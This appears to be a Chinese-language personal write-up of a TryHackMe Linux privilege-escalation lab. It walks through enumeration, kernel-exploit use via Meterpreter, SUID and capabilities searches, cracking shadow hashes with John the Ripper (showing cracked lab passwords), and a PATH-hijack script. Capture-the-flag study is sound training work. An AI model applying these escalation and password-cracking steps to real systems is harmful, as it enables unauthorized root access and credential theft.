> https://tryhackme.com/room/linprivesc
> #Privilege 

# Task 1 Introduction

简介

# Task 2 What is Privilege Escalation?

介绍了何为提权

# Task 3 Enumeration

介绍了如何在拿到shell之后，在目标主机上收集信息
```shell
$ hostname
wade7363

$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014

$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

$ cat /etc/issue
Ubuntu 14.04 LTS \n \l

$ python --version
Python 2.7.6
```
![[Pasted image 20230113152345.png]]

# Task 4 Automated Enumeration Tools

介绍了以下自动化测试工具
-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# Task 5 Privilege Escalation: Kernel Exploits

介绍了如何使用内核漏洞进行提权
```shell
$ ls
bin  boot  cdrom  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
$ cat /etc/issue
Ubuntu 14.04 LTS \n \l
```
使用的Poc可以在Exploit-DB上面找到：https://www.exploit-db.com/exploits/37292
建议使用msfconsole建立一个简单的shell之后，shell_to_meterpreter升级成meterpreter会话，然后再传输poc，在靶机上进行编译之后再执行
![[Pasted image 20230113160928.png]]
![[Pasted image 20230113160947.png]]

# Task 6 Privilege Escalation: Sudo

介绍了如何使用`sudo -l`获取所有免密码sudo使用的程序
![[Pasted image 20230113162044.png]]

# Task 7 Privilege Escalation: SUID

介绍了使用`find / -type f -perm -04000 -ls 2>/dev/null`来对suid特权的文件进行列出来
```shell
find / -type f -perm -04000 -ls 2>/dev/null
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
     3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
     6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
     7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
     1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
     1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
     1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
     1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
     1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
     1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
```

并且介绍了一个在线列表：https://gtfobins.github.io/，用以对比可以利用的程序

对于shadow中密码哈希的破解
```shell
unshadow ./wordlists/rockyou.txt shadow.txt

┌──(randark㉿kali)-[~]
└─$ john --wordlist=./wordlists/rockyou.txt shadow.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (karen)     
Password1        (user2)     
test123          (gerryconway)     
3g 0:00:00:01 DONE (2023-01-13 16:49) 1.754g/s 10778p/s 15569c/s 15569C/s chatty..sweetgurl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

这个环节的靶机，其重点就在base64了
![[Pasted image 20230113165434.png]]

# Task 8 Privilege Escalation: Capabilities

介绍了使用`Capabilities`进行权限管理，并通过此尝试进行提权
```shell
$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```
![[Pasted image 20230115100609.png]]

# Task 9 Privilege Escalation: Cron Jobs

介绍了`Cron`这一控制定时任务的工具，以及如何借助`Cron`进行提权
感觉目标靶机有点问题，在修改所有可能的计划任务之后，仍然没有任何的回传shell
![[Pasted image 20230115104018.png]]

# Task 10 Privilege Escalation: PATH

介绍了利用$PATH变量来控制程序的运行行为
```shell
cd /home/murdoch
touch thm
echo "cat /home/matt/flag6.txt" > thm
chmod +x thm
./test
# 即可得到flag
```
![[Pasted image 20230115110200.png]]

# Task 11 Privilege Escalation: NFS

做个屁，版本都对不上
![[Pasted image 20230115112305.png]]

![[Pasted image 20230115113041.png]]

# Task 12 Capstone Challenge

一个实战模拟靶机
直接参考：https://dev.to/christinec_dev/try-hack-me-linux-privesc-complete-write-up-20fg

> 这波，我受不了环境问题了
